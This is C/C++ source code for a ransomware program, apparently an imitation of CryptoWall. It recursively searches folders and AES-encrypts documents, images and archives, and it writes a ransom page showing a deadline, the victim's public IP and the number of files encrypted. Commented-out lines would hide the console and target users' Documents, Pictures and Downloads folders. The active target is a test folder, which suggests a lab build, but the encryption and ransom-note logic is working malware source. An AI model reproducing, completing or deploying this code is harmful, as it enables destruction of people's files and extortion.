#include <time.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <fileapi.h>
#include <windows.h>
#else
#include <unistd.h>
#include <dirent.h>
#endif

#include "aes.h"
#include "drm.h"
#include "random.h"

unsigned int cant_files = 0;

// Only encrypt file with the next extensions:
const char extensions[][4] = {
  "avi", "bmp", "doc", "gif", "jpg",
  "mkv", "mp3", "mp4", "pdf", "png",
  "ppt", "rar", "txt", "xls", "zip"
};

bool isValidFile(char* file) {
  char* ext = strrchr(file, '.');
  if (ext == NULL) return false;
  ext++;
  bool res = false;
  for (int i = 0; i < (int)sizeof(extensions) && !res; i++)
    res = strcmp(ext, extensions[i]) == 0;
  return res;
}

/*
  To encrypt files using AES 256, the file size must be a multiple of 16 bytes
  This function adds 1 to 16 bytes to the file using ANSI X9.23 padding method
*/
void ANSI_X9_23(char* filename) {
  FILE* file = fopen(filename, "rb+");
  fseek(file, 0, SEEK_END);
  uint32_t size = ftell(file);
  uint8_t len = AES_BLOCKLEN - size % AES_BLOCKLEN;
  uint8_t* pad = new uint8_t[len];
  for (uint8_t i = 0; i < len - 1; i++)
    pad[i] = 0x00;
  pad[len - 1] = len;
  fwrite(pad, sizeof(uint8_t), len, file);
  rewind(file);
  delete[] pad;
  fclose(file);
}

void EncryptFile(char* fname, const uint8_t* key) {
  if (!isValidFile(fname)) return;
  printf("%s\n", fname);
  cant_files++;

  ANSI_X9_23(fname);
  AES_stream_encrypt(fname, key);

  char* dest = new char[strlen(fname) + 11];
  strcpy(dest, fname);
  strcat(dest, ".encrypted");
  AES_stream_decrypt(dest, key);
  delete[] dest;
}

void SearchFiles(const char* sDir, const uint8_t* key) {
#ifdef _WIN32
  WIN32_FIND_DATA fdFile;
  HANDLE hFind = NULL;
  char sPath[512];
  sprintf(sPath, "%s\\*.*", sDir); // Search all files
  hFind = FindFirstFile(sPath, &fdFile);
  do {
    if (strcmp(fdFile.cFileName, ".") != 0 && strcmp(fdFile.cFileName, "..") != 0) {
      // Build up file path
      sprintf(sPath, "%s\\%s", sDir, fdFile.cFileName);
      // Is it a file or folder?
      if (fdFile.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        SearchFiles(sPath, key); // Recursion
      else
        EncryptFile(sPath, key);
    }
  } while (FindNextFile(hFind, &fdFile)); // Find the next file
  FindClose(hFind); // Clean
#else
  DIR* dir = opendir(sDir);
  dirent* entry = readdir(dir);
  char path[512];
  while (entry != NULL) {
    if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
      sprintf(path, "%s/%s", sDir, entry->d_name);  
      if (entry->d_type == DT_DIR)
        SearchFiles(path, key);
      else
        EncryptFile(path, key);
    }
    entry = readdir(dir);
  }
  closedir(dir);
#endif
}

int main() {
  /// HIDE CONSOLE
  // Delete the next two slashes to hide console:
#ifdef _WIN32
  //FreeConsole();
#endif

  if (KillSwitch()) exit(EXIT_FAILURE);

  /// GENERATE KEY
  uint8_t* key = advandedRNG();

  /// SAVE KEY TO FILE
  FILE* kfile = fopen("key.bin", "wb");
  fwrite(key, sizeof(uint8_t), 32, kfile);
  fclose(kfile);

  /// ENCRYPT FILES
  // Encrypt Files in those folders and subfolders:
#ifdef _WIN32
  SearchFiles("..\\testfolder", key);
  //SearchFiles("C:\\Users\\User\\Music", key);
  //SearchFiles("C:\\Users\\User\\Videos", key);
  //SearchFiles("C:\\Users\\User\\Pictures", key);
  //SearchFiles("C:\\Users\\User\\Documents", key);
  //SearchFiles("C:\\Users\\User\\Downloads", key);
#else
  SearchFiles("../testfolder", key);
#endif

  /// GET TIME OF TOMORROW
  time_t timenow = time(NULL) + 24 * 60 * 60;
  tm* timeinfo = localtime(&timenow);
  unsigned int year = timeinfo->tm_year + 1900;
  unsigned int month = timeinfo->tm_mon + 1;

  /// ADD DATE TO FILE
#ifdef _WIN32
  FILE* cryptowall = fopen("cryptowall\\index.htm", "r+");
#else
  FILE* cryptowall = fopen("cryptowall/index.htm", "r+");
#endif
  fseek(cryptowall, 304, SEEK_SET);
  fprintf(cryptowall, "%02u-%02u-%02u %02u:%02u:%02u", year, month,
          timeinfo->tm_mday, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);

  /// GET IP
  unsigned int ip[4];
#ifdef _WIN32
  system("getip.bat");
#else
  system("dig @resolver1.opendns.com A myip.opendns.com +short -4 > ip");
#endif
  FILE* loadip = fopen("ip", "r+");
  fscanf(loadip, "%u.%u.%u.%u", &ip[0], &ip[1], &ip[2], &ip[3]);
  fclose(loadip);

  /// ADD IP
  fseek(cryptowall, 1726, SEEK_SET);
  // ip may have different lengths: 0.0.0.0 / 255.255.255.255, pad with spaces
  char ipbuffer[16] = "               ";
  int ip_pad = sprintf(ipbuffer, "%u.%u.%u.%u", ip[0], ip[1], ip[2], ip[3]);
  ipbuffer[ip_pad] = ' '; // Remove '\0' set by sprintf
  fwrite(ipbuffer, sizeof(char), 15, cryptowall);

  /// ADD Total Files Encrypted
  fseek(cryptowall, 1916, SEEK_SET);
  char cfbuffer[32];
  strcpy(cfbuffer, "      ");
  int cf_pad;
  if (cant_files > 1000)
    cf_pad = sprintf(cfbuffer, "%u,%03u", cant_files / 1000, cant_files % 1000);
  else
    cf_pad = sprintf(cfbuffer, "%u", cant_files % 1000);
  cfbuffer[cf_pad] = ' '; // Remove '\0' set by sprintf
  fwrite(cfbuffer, sizeof(char), 6, cryptowall);
  fclose(cryptowall);

  /// SHOW MESSAGE FULLSCREEN
#ifdef _WIN32
  system("start /b cmd /c \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -new-window cryptowall\\index.htm");
  system("fullscreen.vbs");
#else
  //system("firefox -new-window cryptowall/index.htm");
  sleep(2);
  system("xdotool key Alt+Tab");
  sleep(1);
  system("xdotool key F11");
#endif

  remove("ip");
  delete[] key;
  return 0;
}
